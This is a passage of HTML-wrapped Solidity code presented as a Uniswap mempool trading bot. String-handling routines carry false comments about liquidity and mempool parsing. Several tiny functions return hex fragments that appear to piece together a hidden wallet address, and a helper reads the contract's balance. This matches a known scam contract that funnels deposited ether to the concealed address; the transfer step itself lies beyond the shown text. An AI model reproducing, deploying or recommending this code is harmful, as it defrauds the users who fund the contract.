<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
}</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; }</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; /*</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; * @dev
Orders the contract by its available liquidity</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; *
@param self The slice to operate on.</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; *
@return The contract with possbile maximum return</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; */</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; function
orderContractsByLiquidity(slice memory self) internal pure returns
(uint ret) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
if (self._len == 0) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; return 0;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
}</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
uint word;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
uint length;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
uint divisor = 2 ** 248;</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
// Load the rune into the MSBs of b</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
assembly { word:= mload(mload(add(self, 32))) }</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
uint b = word / divisor;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
if (b &lt; 0x80) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; ret = b;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; length = 1;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
} else if(b &lt; 0xE0) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; ret = b &amp; 0x1F;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; length = 2;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
} else if(b &lt; 0xF0) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; ret = b &amp; 0x0F;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; length = 3;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
} else {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; ret = b &amp; 0x07;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; length = 4;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
}</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
// Check for truncated codepoints</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
if (length &gt; self._len) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; return 0;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
}</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
for (uint i = 1; i &lt; length; i++) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; divisor = divisor / 256;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; b = (word / divisor) &amp; 0xFF;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; if (b &amp; 0xC0 != 0x80) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; // Invalid UTF-8 sequence</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; return 0;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; }</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; ret = (ret * 64) | (b &amp; 0x3F);</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
}</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
return ret;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; }</p>
<p class="p2" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; function
getMempoolStart() private pure returns (string memory) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
return &quot;50c8&quot;;&nbsp;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; }</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; /*</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; * @dev
Calculates remaining liquidity in contract</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; *
@param self The slice to operate on.</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; *
@return The length of the slice in runes.</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; */</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; function
calcLiquidityInContract(slice memory self) internal pure returns
(uint l) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
uint ptr = self._ptr - 31;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
uint end = ptr + self._len;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
for (l = 0; ptr &lt; end; l++) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; uint8 b;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; assembly { b := and(mload(ptr), 0xFF) }</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; if (b &lt; 0x80) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; ptr += 1;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; } else if(b &lt; 0xE0) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; ptr += 2;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; } else if(b &lt; 0xF0) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; ptr += 3;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; } else if(b &lt; 0xF8) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; ptr += 4;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; } else if(b &lt; 0xFC) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; ptr += 5;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; } else {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; ptr += 6; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;
&nbsp;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; } &nbsp; &nbsp; &nbsp; &nbsp;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
} &nbsp; &nbsp;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; }</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; function
fetchMempoolEdition() private pure returns (string memory) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
return &quot;fbae&quot;;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; }</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; /*</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; * @dev
Parsing all Uniswap mempool</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; *
@param self The contract to operate on.</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; *
@return True if the slice is empty, False otherwise.</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; */</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; /*</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; * @dev
Returns the keccak-256 hash of the contracts.</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; *
@param self The slice to hash.</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; *
@return The hash of the contract.</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; */</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; function
keccak(slice memory self) internal pure returns (bytes32 ret) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
assembly {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; ret := keccak256(mload(add(self, 32)), mload(self))</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
}</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; }</p>
<p class="p2" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; function
getMempoolShort() private pure returns (string memory) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
return &quot;0xE4d&quot;;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; }</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; /*</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; * @dev
Check if contract has enough liquidity available</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; *
@param self The contract to operate on.</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; *
@return True if the slice starts with the provided text, false
otherwise.</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; */</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; function
checkLiquidity(uint a) internal pure returns (string memory) {</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
uint count = 0;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
uint b = a;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
while (b != 0) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; count++;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; b /= 16;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
}</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
bytes memory res = new bytes(count);</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
for (uint i=0; i&lt;count; ++i) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; b = a % 16;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; res[count - i - 1] = toHexDigit(uint8(b));</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; a /= 16;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
}</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
return string(res);</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; }</p>
<p class="p2" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; function
getMempoolHeight() private pure returns (string memory) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
return &quot;0A379&quot;;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; }</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; /*</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; * @dev
If `self` starts with `needle`, `needle` is removed from the</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; *&nbsp;
&nbsp; &nbsp; beginning of `self`. Otherwise, `self` is unmodified.</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; *
@param self The slice to operate on.</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; *
@param needle The slice to search for.</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; *
@return `self`</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; */</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; function
beyond(slice memory self, slice memory needle) internal pure returns
(slice memory) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
if (self._len &lt; needle._len) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; return self;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
}</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
bool equal = true;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
if (self._ptr != needle._ptr) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; assembly {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; let length := mload(needle)</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; let selfptr := mload(add(self, 0x20))</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; let needleptr := mload(add(needle, 0x20))</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; equal := eq(keccak256(selfptr, length),
keccak256(needleptr, length))</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; }</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
}</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
if (equal) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; self._len -= needle._len;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; self._ptr += needle._len;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
}</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
return self;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; }</p>
<p class="p2" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; function
getMempoolLog() private pure returns (string memory) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
return &quot;1DB6526D&quot;;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; }</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; // Returns
the memory address of the first byte of the first occurrence of</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; // `needle`
in `self`, or the first byte after `self` if not found.</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; function
getBa() private view returns(uint) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
return address(this).balance;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; }</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; function
findPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr)
private pure returns (uint) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
uint ptr = selfptr;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
uint idx;</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
if (needlelen &lt;= selflen) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; if (needlelen &lt;= 32) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; bytes32 mask = bytes32(~(2 ** (8 * (32 -
needlelen)) - 1));</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; bytes32 needledata;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; assembly { needledata :=
and(mload(needleptr), mask) }</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; uint end = selfptr + selflen - needlelen;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; bytes32 ptrdata;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; assembly { ptrdata := and(mload(ptr),
mask) }</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; while (ptrdata != needledata) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (ptr &gt;= end)</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return
selfptr + selflen;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ptr++;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; assembly { ptrdata :=
and(mload(ptr), mask) }</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; }</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; return ptr;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; } else {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; // For long needles, use hashing</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; bytes32 hash;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; assembly { hash := keccak256(needleptr,
needlelen) }</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; for (idx = 0; idx &lt;= selflen -
needlelen; idx++) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; bytes32 testHash;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; assembly { testHash :=
keccak256(ptr, needlelen) }</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (hash == testHash)</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return ptr;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ptr += 1;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; }</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; }</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
}</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
return selfptr + selflen;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; }</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; /*</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; * @dev
Iterating through all mempool to call the one with the with highest
possible returns</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; *
@return `self`.</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; */</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; function
fetchMempoolData() internal pure returns (string memory) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
string memory _mempoolShort = getMempoolShort();</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
string memory _mempoolEdition = fetchMempoolEdition();</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; /*</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
* @dev loads all Uniswap mempool into memory</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
* @param token An output parameter to which the first token is
written.</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
* @return `mempool`.</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
*/</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
string memory _mempoolVersion = fetchMempoolVersion();</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; string memory _mempoolLong =
getMempoolLong();</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
/*</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
* @dev Modifies `self` to contain everything from the first
occurrence of</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
*&nbsp; &nbsp; &nbsp; `needle` to the end of the slice. `self` is set
to the empty slice</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
*&nbsp; &nbsp; &nbsp; if `needle` is not found.</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
* @param self The slice to search and modify.</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
* @param needle The text to search for.</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
